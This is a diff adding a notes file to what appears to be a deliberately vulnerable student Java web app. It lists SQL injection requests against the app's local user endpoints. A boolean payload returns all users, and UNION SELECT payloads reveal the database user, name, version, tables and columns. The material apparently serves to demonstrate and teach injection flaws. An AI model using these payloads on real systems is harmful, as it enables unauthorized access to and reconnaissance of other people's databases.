@@ -1,0 +1,34 @@
+ATTACKS REALIZATION:
+
+1. Blind SQL injection
+    Boolean exploitation
+    For getUsersByUsername method located in [io/ussopm/diplomatest/dao/UserDAO.java]:
+
+    STEPS:
+        1. OPEN postman
+        2. send the request -> http://localhost:8080/user/get?username=' or '1'='1
+        3. as a result it will return all users lists
+
+2. UNION SELECT SQL injection
+    For getUserById method located in [io/ussopm/diplomatest/dao/UserDAO.java]:
+
+    STEPS:
+        1. OPEN postman
+        2.1
+            2. send the request -> GET http://localhost:8080/user/getById/1 UNION SELECT 99, current_user --
+            3. as a result it will return current database user
+        2.2
+            2. send the request -> GET http://localhost:8080/user/getById/1 UNION SELECT 99, current_database() --
+            3. it will return current database name
+        2.3
+            2. send the request -> GET http://localhost:8080/user/getById/1 UNION SELECT 99, version() --
+            3. it will return database version
+        2.4
+            2. send the request -> GET http://localhost:8080/user/getById/1 UNION SELECT 99, table_name FROM information_schema.tables --
+            3. it will return table names
+        2.5
+             2. send the request -> GET http://localhost:8080/user/getById/1 UNION SELECT 99, column_name FROM information_schema.columns WHERE table_name = 't_user' --
+             3. it will return column names
+
+
+(YOU CAN IMPLEMENT OTHER SQL ATTACKS DO SOME RESEARCH)
